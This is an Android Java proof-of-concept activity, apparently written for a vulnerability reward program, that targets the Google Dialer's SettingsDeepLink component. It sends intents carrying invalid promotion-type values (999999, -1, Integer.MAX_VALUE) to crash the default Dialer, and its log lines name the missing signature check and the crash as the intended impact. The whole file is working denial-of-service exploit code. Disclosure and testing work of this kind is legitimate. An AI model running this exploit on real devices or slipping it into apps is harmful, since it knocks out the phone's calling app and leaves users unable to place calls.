package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class DialerDobbyDoSActivity extends Activity {
    private static final String TAG = "DialerDobbyDoS";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(android.R.layout.simple_list_item_1);
        Log.d(TAG, "=== Dialer GatewayActivity Dobby Handler DoS PoC ===");
        Log.d(TAG, "Target: com.android.dialer.dobby.impl.growthkit.SettingsDeepLink");
        Log.d(TAG, "Bug: DobbyPromoGatewayHandler has NO GoogleSignatureVerifier check");
        Log.d(TAG, "Impact: Crash default Dialer via uncaught IllegalArgumentException");

        testCrashWithInvalidPromoType();
        testCrashWithNegativeType();
        testCrashWithMaxInt();
        testValidPromoTypes();
    }

    private void testCrashWithInvalidPromoType() {
        Log.d(TAG, "\n--- Phase 1: Crash with out-of-range promo type (999999) ---");
        try {
            Intent intent = new Intent("com.android.dialer.dobby.impl.growthkit.ACTION_SHOW_SETTINGS");
            intent.setComponent(new ComponentName(
                "com.google.android.dialer",
                "com.android.dialer.dobby.impl.growthkit.SettingsDeepLink"
            ));
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.putExtra("extra_dobby_promotion_type", 999999);
            startActivity(intent);
            Log.d(TAG, "[SENT] extra_dobby_promotion_type=999999");
            Log.d(TAG, "[EXPECTED] Dialer process crashes with IllegalArgumentException");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] " + e);
        }
    }

    private void testCrashWithNegativeType() {
        Log.d(TAG, "\n--- Phase 2: Crash with negative promo type (-1) ---");
        try {
            Intent intent = new Intent("com.android.dialer.dobby.impl.growthkit.ACTION_SHOW_SETTINGS");
            intent.setComponent(new ComponentName(
                "com.google.android.dialer",
                "com.android.dialer.dobby.impl.growthkit.SettingsDeepLink"
            ));
            intent.putExtra("extra_dobby_promotion_type", -1);
            startActivity(intent);
            Log.d(TAG, "[SENT] extra_dobby_promotion_type=-1");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] " + e);
        }
    }

    private void testCrashWithMaxInt() {
        Log.d(TAG, "\n--- Phase 3: Crash with Integer.MAX_VALUE ---");
        try {
            Intent intent = new Intent("com.android.dialer.dobby.impl.growthkit.ACTION_SHOW_SETTINGS");
            intent.setComponent(new ComponentName(
                "com.google.android.dialer",
                "com.android.dialer.dobby.impl.growthkit.SettingsDeepLink"
            ));
            intent.putExtra("extra_dobby_promotion_type", Integer.MAX_VALUE);
            startActivity(intent);
            Log.d(TAG, "[SENT] extra_dobby_promotion_type=MAX_VALUE");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] " + e);
        }
    }

    private void testValidPromoTypes() {
        Log.d(TAG, "\n--- Phase 4: Test valid promo types 0-5 (should NOT crash) ---");
        for (int i = 0; i <= 5; i++) {
            try {
                Intent intent = new Intent("com.android.dialer.dobby.impl.growthkit.ACTION_SHOW_SETTINGS");
                intent.setComponent(new ComponentName(
                    "com.google.android.dialer",
                    "com.android.dialer.dobby.impl.growthkit.SettingsDeepLink"
                ));
                intent.putExtra("extra_dobby_promotion_type", i);
                startActivity(intent);
                Log.d(TAG, "[SENT] extra_dobby_promotion_type=" + i + " (valid, should open settings)");
            } catch (Exception e) {
                Log.d(TAG, "[ERROR] type=" + i + ": " + e);
            }
        }
        Log.d(TAG, "\n=== Dialer Dobby DoS PoC Complete ===");
    }
}
